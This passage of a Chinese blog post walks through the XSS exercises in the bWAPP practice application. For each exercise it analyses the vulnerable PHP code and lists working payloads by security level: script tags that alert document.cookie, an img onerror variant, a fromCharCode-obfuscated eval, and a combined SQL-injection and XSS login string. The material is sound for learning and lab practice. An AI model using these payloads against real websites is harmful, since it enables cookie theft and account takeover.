+<h3 id="Header注入"><a href="#Header注入" class="headerlink" title="Header注入"></a>Header注入</h3><h4 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>XSS - Reflected (Custom Header)<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Some web clients use custom HTTP request headers...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    Content of our <span class="tag">&lt;<span class="name">b</span>&gt;</span>bWAPP<span class="tag">&lt;/<span class="name">b</span>&gt;</span> header:</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>(getallheaders() <span class="keyword">as</span> $name =&gt; $value)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($name == <span class="string">"bWAPP"</span>)				<span class="comment">//如果存在名为bWAPP的请求头，就读取请求头内容</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;i&gt;"</span> . xss($value) .<span class="string">"&lt;/i&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bWAPP: <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/27/bWAPP-XSS/image-20201006185758145.png" alt="image-20201006185758145"></p>
+<h4 id="mid-2"><a href="#mid-2" class="headerlink" title="mid"></a>mid</h4><p>只要payload中不出现 <code>&#39; &quot; \</code>,均可绕过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bWAPP: <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h3 id="eval注入"><a href="#eval注入" class="headerlink" title="eval注入"></a>eval注入</h3><h4 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"document.write(&lt;?php echo xss($_GET["</span>date<span class="string">"])?&gt;)"</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>更改url参数，进行注入</p>
+<p>可利用 <code>document.write()</code>直接执行alert()，或对eval()进行闭合</p>
+<h4 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="built_in">document</span>.cookie)</span><br><span class="line"></span><br><span class="line"><span class="comment">//)");alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-3"><a href="#mid-3" class="headerlink" title="mid"></a>mid</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">47</span>,<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">47</span>,<span class="number">41</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//eval(alert(/xss/))</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.runoob.com/jsref/jsref-eval.html" target="_blank" rel="noopener">JavaScript eval() 函数</a></p>
+<p><a href="https://www.runoob.com/jsref/jsref-fromcharcode.html" target="_blank" rel="noopener">JavaScript fromCharCode() 方法</a></p>
+<h4 id="high-5"><a href="#high-5" class="headerlink" title="high"></a>high</h4><p>写死了，只要不是Date()函数就报错，无法绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"date"</span>]))</span><br><span class="line">   &#123;    </span><br><span class="line">       <span class="keyword">if</span>($_COOKIE[<span class="string">"security_level"</span>] == <span class="string">"2"</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">if</span>($_GET[<span class="string">"date"</span>] != <span class="string">"Date()"</span>)</span><br><span class="line">           &#123; </span><br><span class="line">               <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;font color=\"red\"&gt;Invalid input detected!&lt;/font&gt;&lt;/p&gt;"</span>;     </span><br><span class="line"></span><br><span class="line">           &#125;&#125;&#125;         </span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="HREF注入"><a href="#HREF注入" class="headerlink" title="HREF注入"></a>HREF注入</h3><h4 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;td align="center"&gt; &lt;a href=xss_href-3.php?movie=&lt;?php echo $row["id"]; ?&gt;&amp;name=&lt;?php echo hpp($name);?&gt;&amp;action=vote&gt;Vote&lt;/a&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过对 <code>$name</code>的控制，实现绕过</p>
+<h4 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=?&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span>&amp;action=vote</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-high-1"><a href="#mid-high-1" class="headerlink" title="mid/high"></a>mid/high</h4><p>使用 <code>urlencode()</code>进行url编码，无法绕过</p>
+<h3 id="Login-form注入"><a href="#Login-form注入" class="headerlink" title="Login form注入"></a>Login form注入</h3><h4 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM heroes WHERE login = '"</span> . $login . <span class="string">"' AND password = '"</span> . $password . <span class="string">"'"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>通过sql注入和xss联合使用</p>
+<h4 id="low-6"><a href="#low-6" class="headerlink" title="low"></a>low</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or 1=1 "&lt;script&gt;alert(document.cookie)&lt;/script&gt;"</span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-high-2"><a href="#mid-high-2" class="headerlink" title="mid/high"></a>mid/high</h4><p>无法绕过</p>
+<h3 id="PHP-SELF-注入"><a href="#PHP-SELF-注入" class="headerlink" title="PHP_SELF 注入"></a>PHP_SELF 注入</h3><h4 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"form"</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">"firstname"</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">"lastname"</span>]))</span><br><span class="line">    &#123;   </span><br><span class="line">        $firstname = $_GET[<span class="string">"firstname"</span>];</span><br><span class="line">        $lastname = $_GET[<span class="string">"lastname"</span>];    </span><br><span class="line">        <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;font color=\"red\"&gt;Please enter both fields...&lt;/font&gt;"</span>;       </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>            </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Welcome "</span> . xss($firstname) . <span class="string">" "</span> . xss($lastname);   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>对用户输入内容进行输出。（类似留言板）</p>
+<h4 id="low-7"><a href="#low-7" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-4"><a href="#mid-4" class="headerlink" title="mid"></a>mid</h4><p>不出现 <code>&#39; &quot; \</code> 即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-6"><a href="#high-6" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h3 id="请求头Referer注入"><a href="#请求头Referer注入" class="headerlink" title="请求头Referer注入"></a>请求头Referer注入</h3><h4 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_REFERER"</span>])) </span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="comment">// print_r($_SERVER);</span></span><br><span class="line">        $referer = $_SERVER[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;The referer: &lt;i&gt;"</span> . xss($referer) . <span class="string">"&lt;/i&gt;&lt;/p&gt;"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>     </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;font color=\"red\"&gt;No referer was used!&lt;/font&gt;&lt;/p&gt;"</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>与留言版类似，注入点在 <code>Referer</code> 字段</p>
+<h4 id="low-8"><a href="#low-8" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-5"><a href="#mid-5" class="headerlink" title="mid"></a>mid</h4><p>不出现 <code>&#39; &quot; \</code> 即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-7"><a href="#high-7" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h3 id="请求头User-Agent注入"><a href="#请求头User-Agent注入" class="headerlink" title="请求头User-Agent注入"></a>请求头User-Agent注入</h3><h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_USER_AGENT"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">// print_r($_SERVER);</span></span><br><span class="line">        $user_agent = $_SERVER[<span class="string">"HTTP_USER_AGENT"</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your User-Agent: &lt;i&gt;"</span> . xss($user_agent) . <span class="string">"&lt;/i&gt;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;font color=\"red\"&gt;No User-Agent was used!&lt;/font&gt;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="low-9"><a href="#low-9" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-6"><a href="#mid-6" class="headerlink" title="mid"></a>mid</h4><p>不出现 <code>&#39; &quot; \</code> 即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-8"><a href="#high-8" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><h4 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"40"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row-&gt;id; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row-&gt;owner; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row-&gt;date; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row-&gt;entry; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="comment">&lt;!--根据不同的security_level对$row-&gt;entry进行消毒--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="low-10"><a href="#low-10" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-7"><a href="#mid-7" class="headerlink" title="mid"></a>mid</h4><p>不出现 <code>&#39; &quot; \</code> 即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-9"><a href="#high-9" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h3 id="Change-Secret-HTML-hidden-注入"><a href="#Change-Secret-HTML-hidden-注入" class="headerlink" title="Change Secret(HTML hidden)注入"></a>Change Secret(HTML hidden)注入</h3><h4 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//low 对提交的$login和$secret都进行了严格的消毒</span></span><br><span class="line">    $login = mysqli_real_escape_string($link, $login);</span><br><span class="line">    $secret = mysqli_real_escape_string($link, $secret);</span><br><span class="line">    $secret = xss($secret);</span><br><span class="line"></span><br><span class="line"><span class="comment">//mid high对提交的$secret都进行了严格的消毒</span></span><br><span class="line">    $secret = mysqli_real_escape_string($link, $secret);</span><br><span class="line">    $secret = htmlspecialchars($secret, ENT_QUOTES, <span class="string">"UTF-8"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>故无法直接对 <code>secret</code>进行注入</p>
+<h4 id="low-11"><a href="#low-11" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/27/bWAPP-XSS/image-20201007191839789.png" alt="image-20201007191839789"></p>
+<h4 id="mid-high-3"><a href="#mid-high-3" class="headerlink" title="mid/high"></a>mid/high</h4><p>无法绕过</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS注入"><span class="toc-number">1.</span> <span class="toc-text">XSS注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.1.</span> <span class="toc-text">基础知识</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#演练"><span class="toc-number">2.</span> <span class="toc-text">演练</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#反射型"><span class="toc-number">2.1.</span> <span class="toc-text">反射型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-POST型"><span class="toc-number">2.1.1.</span> <span class="toc-text">GET&#x2F;POST型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSON反射"><span class="toc-number">2.1.2.</span> <span class="toc-text">JSON反射</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low-1"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">low</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#代码分析"><span class="toc-number">2.1.2.1.1.</span> <span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-high"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AJAX反射"><span class="toc-number">2.1.3.</span> <span class="toc-text">AJAX反射</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low-mid"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">low&#x2F;mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-1"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML反射"><span class="toc-number">2.1.4.</span> <span class="toc-text">XML反射</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low-mid-1"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">low&#x2F;mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-2"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Referer-注入"><span class="toc-number">2.1.5.</span> <span class="toc-text">Referer 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-1"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-2"><span class="toc-number">2.1.5.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-1"><span class="toc-number">2.1.5.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-3"><span class="toc-number">2.1.5.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Header注入"><span class="toc-number">2.1.6.</span> <span class="toc-text">Header注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-2"><span class="toc-number">2.1.6.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-3"><span class="toc-number">2.1.6.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-2"><span class="toc-number">2.1.6.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-4"><span class="toc-number">2.1.6.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval注入"><span class="toc-number">2.1.7.</span> <span class="toc-text">eval注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-3"><span class="toc-number">2.1.7.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-4"><span class="toc-number">2.1.7.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-3"><span class="toc-number">2.1.7.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-5"><span class="toc-number">2.1.7.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HREF注入"><span class="toc-number">2.1.8.</span> <span class="toc-text">HREF注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-4"><span class="toc-number">2.1.8.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-5"><span class="toc-number">2.1.8.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-high-1"><span class="toc-number">2.1.8.3.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-form注入"><span class="toc-number">2.1.9.</span> <span class="toc-text">Login form注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-5"><span class="toc-number">2.1.9.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-6"><span class="toc-number">2.1.9.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-high-2"><span class="toc-number">2.1.9.3.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-SELF-注入"><span class="toc-number">2.1.10.</span> <span class="toc-text">PHP_SELF 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-6"><span class="toc-number">2.1.10.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-7"><span class="toc-number">2.1.10.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-4"><span class="toc-number">2.1.10.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-6"><span class="toc-number">2.1.10.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#请求头Referer注入"><span class="toc-number">2.1.11.</span> <span class="toc-text">请求头Referer注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-7"><span class="toc-number">2.1.11.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-8"><span class="toc-number">2.1.11.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-5"><span class="toc-number">2.1.11.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-7"><span class="toc-number">2.1.11.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#请求头User-Agent注入"><span class="toc-number">2.1.12.</span> <span class="toc-text">请求头User-Agent注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-8"><span class="toc-number">2.1.12.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-9"><span class="toc-number">2.1.12.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-6"><span class="toc-number">2.1.12.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-8"><span class="toc-number">2.1.12.4.</span> <span class="toc-text">high</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 